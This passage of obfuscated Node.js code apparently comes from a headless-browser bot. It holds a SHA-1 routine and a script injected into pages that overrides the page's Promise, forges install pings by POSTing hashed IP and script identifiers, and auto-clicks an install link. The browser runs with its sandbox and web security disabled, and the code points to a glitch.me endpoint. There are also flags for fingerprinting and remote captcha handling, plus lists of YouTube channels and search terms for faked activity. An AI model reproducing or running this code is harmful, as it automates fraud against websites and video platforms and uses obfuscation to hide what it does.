0x955 * 0x4 + 0x2 * -0x211b] = J[-0x1f29 + -0x17e1 + 0x3715] = J[-0xb3 * 0x25 + 0xc45 + 0xda6] = J[-0x12b3 + -0x25 * 0xf3 + 0x35df] = J[0x19ac + 0x3ae + -0x1d4c] = J[0x1b2 + -0xad * -0x4 + -0x1 * 0x457] = -0x823 + 0x318 + 0x50b), J[-0xbcf * 0x3 + 0x2cb + 0x20b0] = this['hBytes'] << 0x7 * 0x129 + 0x2294 + -0x2ab0 * 0x1 | this['bytes'] >>> 0x108 * -0x1 + -0x66e + -0x793 * -0x1, J[0xcef * -0x2 + 0x30a * -0xa + 0x455 * 0xd] = this['bytes'] << 0xc * 0x229 + -0x3c3 + -0x1626, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1c2d + 0xd2a + -0x2947 * 0x1; J < 0x9d9 + 0x1206 + -0x1b8f; ++J)
                K = Q[J - (-0x41 * -0x16 + -0xa7b + 0x4e8)] ^ Q[J - (0x252c + 0x81 * 0x6 + -0x282a * 0x1)] ^ Q[J - (0x3 * 0x955 + -0x17b9 * -0x1 + -0x33aa)] ^ Q[J - (-0x2473 * -0x1 + 0xa * -0x3df + 0x5 * 0x77)], Q[J] = K << -0x51b * 0x3 + -0xbe9 * 0x1 + 0x1b3b * 0x1 | K >>> 0x77b + 0x65 * 0x2f + -0x19e7;
              for (J = -0x1d13 + -0x2f * 0x97 + -0x5ae * -0xa; J < 0x152 + -0x41 * -0x7 + -0x305; J += 0x1 * 0x1928 + -0x25d * 0x2 + -0x1469)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4 * 0x12a + -0x91 * -0x2b + -0x13ae | L >>> -0x9f * -0x7 + 0x16f9 + 0x1b37 * -0x1) + (M & N | ~M & O) + P + (0x25e5b0bd * -0x1 + -0x6 * 0xcd156de + 0xad * 0x12fd0f2) + Q[J] << 0x2396 + 0x4f * 0x1f + -0x2d27) << 0x1e8 * 0x1 + 0x1f41 + 0x3 * -0xb0c | P >>> 0x98e + 0x70b * 0x2 + -0x1789) + (L & (M = M << -0x2 * -0x542 + -0x939 * -0x2 + -0x1cd8 * 0x1 | M >>> -0x2657 + -0xc37 + -0x2 * -0x1948) | ~L & N) + O + (0x1f3a1782 + 0x291b80d7 + 0x122ce140) + Q[J + (-0x22b1 * -0x1 + 0x992 + -0x2c42)] << -0x2498 * -0x1 + -0x1 * 0xd + -0x1 * 0x248b) << -0x51e + -0x245 + 0x9e * 0xc | O >>> -0x1c39 + -0x1c99 + 0x1 * 0x38ed) + (P & (L = L << -0xe02 + 0x26a2 + -0x1882 * 0x1 | L >>> -0x351 + -0x1b82 + 0x1ed5) | ~P & M) + N + (0xcb * -0xb51f75 + -0x3dd33c54 + -0x61f * -0x3059cc) + Q[J + (-0x1 * 0x1b22 + -0xa3f + 0x233 * 0x11)] << -0x67 * 0x17 + -0x130c + 0x1c4d) << 0x224e + -0x8ba * -0x4 + -0x1 * 0x4531 | N >>> 0x1 * -0x23f3 + 0x644 + 0x1dca) + (O & (P = P << -0x3 * 0x315 + 0x1d * -0x8d + 0x1956 | P >>> 0x1 * 0x1c96 + -0x1501 + -0x793) | ~O & L) + M + (0x21 * -0x34b2db5 + -0x1 * -0x4d86ca71 + 0x79ac937d) + Q[J + (0x2e * 0xc1 + -0x1239 + -0x1072)] << -0x12ba + -0x23fa + -0x4 * -0xdad) << 0x2033 + 0x2646 + -0x4674 | M >>> 0x1f73 + 0x1a6 * 0x7 + 0x1571 * -0x2) + (N & (O = O << 0x1b1f + -0xc01 * 0x2 + -0xd * 0x3b | O >>> 0x1 * 0x1ee3 + 0x1 * -0x2a3 + -0x1c3e) | ~N & P) + L + (0x1817a1d3 + -0xcbc * -0xa456c + -0x4061338a) + Q[J + (-0x26e6 + -0xef * -0x1d + 0xbd7)] << 0x3b3 * 0x1 + 0x23a + -0x25 * 0x29, N = N << -0x170d + -0x5f * -0x4c + 0x1 * -0x509 | N >>> -0x29 * 0x61 + 0x121 * 0x21 + -0x15b6;
              for (; J < -0x9ab + -0x1e7f + 0x2852; J += 0x127a + -0x17c8 + 0x553)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x452 * -0x7 + 0xc59 + -0x2a92 | L >>> 0x561 + 0x3 * -0x1c8 + 0x1 * 0x12) + (M ^ N ^ O) + P + (-0xadde6b * -0x60 + -0x642faea9 + 0x91d6322a) + Q[J] << 0x17 * -0xbf + 0x17e2 + 0x6b9 * -0x1) << 0xe * 0x1a2 + -0x1d1f + 0x648 | P >>> -0xcd5 * 0x3 + 0x6dd * -0x1 + 0x2d77) + (L ^ (M = M << 0x2585 + -0x2e7 + 0xb80 * -0x3 | M >>> 0x2465 + 0x106 * 0x1 + 0x1 * -0x2569) ^ N) + O + (-0x3ee4ef4c + -0x9157 * -0x54be + 0x7da2705b) + Q[J + (0x383 + -0x548 + 0x1c6)] << 0x94 * -0x8 + -0xacc + 0xf6c) << -0xd * 0x16 + -0x9 * 0x412 + -0xc97 * -0x3 | O >>> 0xea3 + 0x154b + -0x23d3) + (P ^ (L = L << -0x2 * 0xa84 + 0x8cb * 0x2 + 0x390 | L >>> -0x1 * 0x171d + -0x1788 + -0x3 * -0xf8d) ^ M) + N + (0x1 * -0x4d070875 + -0x24cb * 0x2c6c0 + 0x122078e56) + Q[J + (-0xa68 + 0x39 * 0x7b + 0x18b * -0xb)] << 0xac4 * -0x1 + 0x16d8 + -0x2 * 0x60a) << 0x1206 + 0x1b0b + -0x3 * 0xf04 | N >>> -0x3 * -0x9d4 + -0x210 + -0x1b51) + (O ^ (P = P << 0x1 * 0x1a6b + -0xb7 * -0x1d + -0x2f08 | P >>> -0x40 * -0x22 + -0x22 * -0x9a + 0x5 * -0x5ca) ^ L) + M + (0x1 * 0x19c50c19 + -0x620401b1 + 0xb718e139) + Q[J + (0x126e + -0xd5b + -0x51 * 0x10)] << -0x2 * 0xeb3 + 0x191f + 0x447) << -0x244b + 0x1d * -0x9d + 0x3619 | M >>> 0x114 * -0x22 + -0x3af + 0x3e * 0xa7) + (N ^ (O = O << -0x145a + -0x23c7 + 0x383f | O >>> 0x1d0f + -0x750 + 0x1 * -0x15bd) ^ P) + L + (0x8f1db * 0x133 + 0x17ca70b5 + 0x1 * 0x4c55714b) + Q[J + (0x1fd6 + 0x1cb7 + -0x3c89 * 0x1)] << -0x14e * -0x11 + -0x11 * -0x1bf + -0x33dd, N = N << 0x7 * -0x23e + -0x20b9 + 0x19 * 0x1f1 | N >>> 0x4b * 0x6b + -0x98 * 0x22 + -0xb27;
              for (; J < 0x1965 + 0x64d + 0xfbb * -0x2; J += 0x234e + 0x521 + -0x1 * 0x286a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x709 + -0x2272 + 0x1b6e | L >>> -0x700 + -0x953 + -0x6 * -0x2bd) + (M & N | M & O | N & O) + P - (0x2aa6baac + 0x27e5bddd + 0x1e57ca9b) + Q[J] << 0xb * -0x283 + 0x186f + 0x332) << -0x203 * -0x8 + -0xcee * -0x2 + -0x29ef | P >>> -0x6d * -0x47 + -0x1a3 * 0x5 + -0x15f1) + (L & (M = M << 0x11 * 0xb1 + -0x6a * 0x2b + 0x62b | M >>> 0x2551 + 0x6 * 0xd3 + -0x1d * 0x175) | L & N | M & N) + O - (-0xf73bd4 * 0xb5 + -0x3a1e7bcf * -0x1 + 0xe5931439) + Q[J + (-0x192b + -0x1d9a + -0x9 * -0x616)] << -0x1 * 0x1baa + -0x136e + 0x2f18) << 0x1380 + 0x1803 * -0x1 + 0xe8 * 0x5 | O >>> 0xbd6 + -0x6d7 * 0x3 + 0x8ca) + (P & (L = L << -0x1bdb + -0x3 * 0x936 + -0x5 * -0xb1f | L >>> -0x21d * 0x11 + 0x1e06 + 0x5e9) | P & M | L & M) + N - (-0x92f9d782 + 0xbd1fc26d + 0x2d * 0x19273bd) + Q[J + (0x563 + 0x124c + -0x17ad)] << -0x1 * -0x251 + 0x4c * -0x56 + -0x351 * -0x7) << -0xe2 * -0x4 + 0x2072 + 0x1 * -0x23f5 | N >>> 0x2203 * 0x1 + -0x1cd9 + 0xb9 * -0x7) + (O & (P = P << 0x270b + 0xcce + 0x143 * -0x29 | P >>> -0x5 * 0x7b9 + -0x5 * -0x6a3 + 0x57 * 0x10) | O & L | P & L) + M - (-0xc0338877 + 0x814304d3 + -0xafd4c6c8 * -0x1) + Q[J + (-0x21aa + 0x1489 + 0x3a * 0x3a)] << -0xa65 * -0x1 + 0x139f * -0x1 + 0x93a) << -0x21 * -0x8e + -0x207f + 0xe36 | M >>> 0x1de9 * 0x1 + 0x1 * 0x15b7 + -0x3385) + (N & (O = O << -0x1d * -0x95 + 0x45e * -0x1 + -0xc65 | O >>> -0x168 + 0x371 + 0xad * -0x3) | N & P | O & P) + L - (-0xa5a7ab38 + 0xb51efb2d + 0x616cf32f) + Q[J + (-0x9 * -0x2bd + 0x1eb + -0x1a8c)] << 0x2356 + -0x1e7 * -0x11 + -0x43ad, N = N << -0x1 * -0x1b83 + -0x15cf + -0x596 | N >>> -0x2413 * 0x1 + -0x1f72 + -0x1 * -0x4387;
              for (; J < 0x4a8 + -0xd7a + -0x2 * -0x491; J += -0x11 * 0xf2 + -0x11ad + 0x21c4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x15d * 0xe + -0x132b * -0x1 + -0x2 * 0x8 | L >>> 0x2172 + 0x1181 + -0x32d8) + (M ^ N ^ O) + P - (-0x7021fa9 + -0x24 * -0xa74f1e + 0x25183d9b) + Q[J] << -0x1d62 + -0x1 * 0x20fe + 0x3e60) << 0x19 * -0xdc + 0x15d1 + -0x50 | P >>> 0x6ab + -0x217a + 0x1aea) + (L ^ (M = M << -0x1821 + 0x207a * -0x1 + 0x38b9 | M >>> 0x119 * -0x3 + -0x285 + 0x5 * 0x12a) ^ N) + O - (-0x55b67b8d + -0x245 * 0x28f6fd + 0x2fa69ec * 0x4e) + Q[J + (-0x1 * -0xd39 + -0x673 + -0x6c5)] << 0xf44 + -0x11df + -0x1d * -0x17) << -0x15df * 0x1 + -0x788 + 0x1d6c | O >>> 0x1ed4 + 0x26ed + -0x45a6) + (P ^ (L = L << 0x488 + -0x2694 * -0x1 + -0x2afe * 0x1 | L >>> 0xdac + -0x19cd + 0xd * 0xef) ^ M) + N - (-0x5fea7843 + -0x285202db * 0x1 + 0xbdd9b948) + Q[J + (-0x2 * 0x6de + 0x183a + -0xa7c)] << -0x1 * 0x24da + -0xb9a + 0x3074) << 0x2b * 0x97 + 0x1105 * 0x1 + -0x5 * 0x879 | N >>> -0x1e10 + 0x1581 + 0x8aa) + (O ^ (P = P << 0x1969 + -0x1eec + 0x5a1 | P >>> 0x674 + -0x25d1 + 0x1 * 0x1f5f) ^ L) + M - (-0x53b5e2e9 + 0x13437f44 + 0x275a8b45 * 0x3) + Q[J + (0x1 * 0x83 + 0x30e + -0x38e)] << 0x17a + -0x1 * 0x1ad6 + 0x195c) << -0x23f2 + -0x2128 + 0x451f | M >>> 0x1b3b * -0x1 + -0x13 * -0x135 + 0x467) + (N ^ (O = O << 0x1242 + 0x19ee + 0x1609 * -0x2 | O >>> -0x1965 + -0x1 * -0x20bc + 0x1 * -0x755) ^ P) + L - (0x290f82c1 + -0x5fcdd1bc + 0xf35f * 0x71fb) + Q[J + (0xf * -0x298 + 0x1 * 0x2439 + -0x1 * -0x2b3)] << 0x1fce + -0x26e5 + 0x16b * 0x5, N = N << 0x541 + -0x9b6 + 0x493 | N >>> -0x22c0 + 0x4 * -0x7db + -0x2b * -0x18a;
              this['h0'] = this['h0'] + L << -0x4 * -0x71d + 0x1a8 * -0x1 + -0x2 * 0xd66, this['h1'] = this['h1'] + M << -0x2 * 0xd15 + -0xa19 + -0x2443 * -0x1, this['h2'] = this['h2'] + N << -0x4f * -0x29 + -0x1f0b + 0x1264 * 0x1, this['h3'] = this['h3'] + O << 0x27a * 0x6 + 0x18b4 + -0x8 * 0x4f2, this['h4'] = this['h4'] + P << 0x1a11 * 0x1 + 0x1e5d + -0x386e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1393 + -0x2529 + 0x38d8 & 0x4a7 + 0x41e + -0x8b6] + w[J >> -0x2105 * 0x1 + -0x1a9d + 0x3bba & -0x1e5d * 0x1 + -0x989 + 0x27f5] + w[J >> -0x1 * -0x1cdc + 0x13 * 0x6a + -0x24a6 * 0x1 & -0xd * 0x23b + -0x821 + 0x1 * 0x252f] + w[J >> 0x628 + -0x1a28 + 0x1410 & 0x1818 + 0x1 * -0x97b + -0xe8e] + w[J >> -0xb34 + -0x1 * 0xd79 + 0x18b9 & 0x1f8d * 0x1 + 0xb66 + -0x2ae4] + w[J >> -0x1e6c + -0x1c1d + 0x3a91 & -0x139 * -0x17 + -0x1066 * 0x1 + -0xbaa] + w[J >> -0x991 * 0x1 + -0x1055 + -0xd6 * -0x1f & -0x1b61 + -0x6bd * -0x1 + -0x14b3 * -0x1] + w[-0x2e * -0x92 + -0x15dc + -0x55 * 0xd & J] + w[K >> 0x19d8 + 0x878 + -0x2 * 0x111a & 0x2195 * 0x1 + 0x7b5 * 0x2 + -0x90 * 0x57] + w[K >> 0x8a8 + -0x3 * 0x89b + 0x1141 & -0xc5b + -0x1aa5 * 0x1 + 0x38d * 0xb] + w[K >> -0xcf9 + 0x5 * 0x1c7 + 0x1a * 0x29 & 0xc * 0x30e + -0x1 * 0x4ae + -0x1feb] + w[K >> 0x6fe * -0x4 + -0x2443 + 0x404b & -0x246d + -0x17c4 + -0x40 * -0xf1] + w[K >> -0x166b + -0x5ef + -0x2 * -0xe33 & 0x8d1 + -0x23d3 + 0x1b11] + w[K >> -0xde1 + -0x1a57 * 0x1 + 0xe0 * 0x2e & 0x5 * -0x675 + 0x1a0 * -0xb + 0x3238] + w[K >> 0x38 * -0x1f + 0x494 * 0x2 + -0x25c & 0x2171 + 0x9b6 + 0x38 * -0xc5] + w[0x6f * -0x1 + -0x57a * 0x1 + -0x2fc * -0x2 & K] + w[L >> -0x3 * -0xe3 + -0xd0 * -0x1d + -0x1a1d & 0x16 * 0x166 + 0x17fe + 0x36b3 * -0x1] + w[L >> -0x106 * 0x1 + -0x2292 + 0x23b0 & 0x1 * -0x1f9d + 0x957 + 0x1655 * 0x1] + w[L >> 0x4 * -0x5da + 0x16d5 + 0x1 * 0xa7 & -0x2545 + 0x2575 * 0x1 + -0x21] + w[L >> -0xdcb + -0xa71 + -0x4dc * -0x5 & -0x1192 + 0x1 * -0x1f2d + 0x2 * 0x1867] + w[L >> -0x1b93 + -0x51 * 0x16 + -0xb87 * -0x3 & -0x14b8 + 0x1a39 + -0x572] + w[L >> 0x47 * 0x67 + -0x65 * -0x4e + -0x7 * 0x879 & 0x23cb + -0x26d4 + -0x3 * -0x108] + w[L >> -0x78c + 0x6e6 + 0xaa & 0x1acb + 0x3b * -0x73 + -0x3b] + w[-0x59e * 0x4 + -0xec * 0x4 + 0x1a37 & L] + w[M >> 0x1c3d + 0x7 * -0x145 + -0x133e & 0x38b * -0x9 + -0x1eef * -0x1 + 0x103] + w[M >> 0x12f7 + 0x4 * 0x217 + 0x1 * -0x1b3b & 0xdfd + 0x25c0 + 0x23 * -0x17a] + w[M >> -0xe78 + 0x3 * 0x503 + -0x7d & 0x23ed * -0x1 + 0xe15 + -0x74d * -0x3] + w[M >> -0x1613 * 0x1 + -0x1e4c + 0x346f & 0x1 * 0x1cf7 + -0xb76 + -0x1172] + w[M >> 0xa * -0x106 + 0x1946 + 0x77f * -0x2 & -0xbf + 0x413 * 0x1 + -0x345] + w[M >> 0x137 * -0x11 + 0x7f7 * 0x2 + 0x4c1 * 0x1 & 0x22 * 0x115 + -0xf * 0x1cf + 0x99a * -0x1] + w[M >> 0x1bf8 + -0x225 * -0x6 + -0x28d2 & 0x1e4d * 0x1 + -0xc * -0x1f5 + -0x35ba] + w[-0x1fe3 + 0xa61 * -0x1 + 0x2a53 & M] + w[N >> -0x1d86 + 0x273 + 0x1b2f & -0x25b3 + -0x136 * 0x6 + 0x2d06] + w[N >> 0x1 * 0x1eab + 0xb * -0x3e + -0x1be9 & -0x189b + 0xcd * 0xf + 0xca7] + w[N >> 0x299 + 0x2556 + -0x27db & 0x1b76 + -0x970 + -0xdb * 0x15] + w[N >> -0x5c9 + 0xd13 * 0x2 + -0x1 * 0x144d & 0x2f4 * -0x1 + -0x34f + 0x652] + w[N >> -0x1ec8 + -0x256e + -0x1 * -0x4442 & -0x1510 + 0x1 * -0x2489 + 0x39a8 * 0x1] + w[N >> -0x6ab * 0x1 + -0x3 * -0x518 + -0x895 & -0x1f6e + 0xbb + 0x1ec2] + w[N >> -0x125 * 0xc + 0x14c5 + -0x705 & -0x6a * -0x27 + -0x1 * 0x1711 + 0x6fa] + w[0x239b + 0xe5d * -0x2 + 0x2 * -0x369 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1365 + 0x2d * -0x8d + 0x2c46 & -0x13d8 + -0x1601 * 0x1 + -0x4 * -0xab6,
                J >> 0x167b + -0x1 * 0x186a + 0x49 * 0x7 & 0x1caf + 0x6c3 + -0x2273,
                J >> -0x1a3f + 0x43 * 0x33 + 0xcee & 0x16 * 0x151 + -0x12d2 + 0x925 * -0x1,
                0x66c + -0x160c + 0x109f & J,
                K >> 0xea * -0xf + 0x2586 + 0x17b8 * -0x1 & -0x23c7 + -0x15c8 + -0x2 * -0x1d47,
                K >> 0x278 + 0x1944 + -0x1bac & -0xe7d * -0x1 + -0xad6 + -0x2a8,
                K >> -0x1ff3 * -0x1 + -0x1338 + -0xcb3 & 0x4a * -0x41 + -0x1 * -0x1091 + -0x1 * -0x338,
                0x1 * 0x45 + -0x242f + 0x24e9 & K,
                L >> 0x135e + -0x1277 + -0x17 * 0x9 & 0x1145 + -0x2612 + 0x15cc,
                L >> 0x1306 + 0x1c60 + -0x2f56 & 0xb51 + 0x274 + -0xcc6,
                L >> 0x23b7 + 0x9d * 0x2b + 0x3e0e * -0x1 & 0x1 * -0xe4d + 0x4ca + 0xa82,
                0x7 * 0x1c4 + -0x11f * 0xb + 0xf8 & L,
                M >> -0x1a2d + -0xb6a + 0x25af & -0x7 * -0x205 + -0x3 * 0x949 + 0xeb7,
                M >> -0x1349 * -0x1 + -0xa91 + -0x8a8 & 0x144 * -0x18 + 0x8 * 0x44 + 0x1d3f,
                M >> -0x1736 + 0x1cd6 + -0x4 * 0x166 & -0x1929 + -0x1327 + 0x2d4f * 0x1,
                -0x1c50 + -0x26 * -0x71 + 0xc89 & M,
                N >> -0x6 * 0x3d9 + 0x23d5 * -0x1 + 0x3b03 & -0x1 * 0x178 + -0x1 * -0x1d69 + -0x1af2,
                N >> -0x9f3 * 0x3 + -0x1bb * -0x1 + -0x2 * -0xe17 & 0x65 * -0xb + 0x2322 + 0x1 * -0x1dcc,
                N >> -0xc9 * -0x29 + -0xe * -0x161 + -0x3377 & 0xaa * 0xf + 0x1955 + -0x224c,
                0x7 * 0x164 + -0x1 * -0x1919 + -0x10eb * 0x2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x350 + -0xfa1 + 0xc65), (K = new DataView(J))['setUint32'](0x49 * 0x75 + -0x2e8 + -0x1e75, this['h0']), K['setUint32'](-0x1ffc + -0x3b * -0x38 + 0x263 * 0x8, this['h1']), K['setUint32'](-0x1 * 0x21c1 + -0x13ee * -0x1 + 0xddb, this['h2']), K['setUint32'](0x723 + 0xc45 + 0x15 * -0xec, this['h3']), K['setUint32'](-0x16d9 + -0x363 + 0x1a4c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xcb5 * -0x1 + -0x1 * -0x1ed1 + -0x2b86];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x15fa + 0x15bb + -0x2bb5;
            J[-0xd * -0x26 + 0x781 + -0x96f]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2572 + -0x1 * -0x696 + -0x581 * 0x8] = L => {
              const T = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I[T(0x11) + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x632 * -0x4 + -0xd * -0xb5 + 0xf98), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xf6e + -0xc8 + -0xea5;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x52 * -0x71 + -0x3 * -0x5e7 + 0x1859), Promise['resolve'](-0x198a * 0x1 + 0x844 * -0x1 + 0x21cf);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1d * -0x1 + 0x2 * 0x9ef + -0x37 * 0x5d; j < 0x1154 * -0x2 + -0xbe3 * -0x1 + 0x16c6; j++)
    i();
}
const NETWORK_PATIENCE = 0x17 * -0x115 + -0x3b95 * -0x1 + -0x372 * 0x1 + (0x22ef + 0x1 * -0x1e7b + -0x6 * -0x136) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x3 * 0x7ff + -0xb18 + -0x22 * 0x61) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + U(0xf) + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      U(0x6) + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x8 * -0x2fc + -0x1270 + 0x10 * -0x57; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + V(0xb, 'F2AC') + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x15d2 + -0xd5f + -0x1 * 0x869)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1137 + -0xc9d + 0x2 * 0xeef)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + V(0xe, 'OtmR') + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 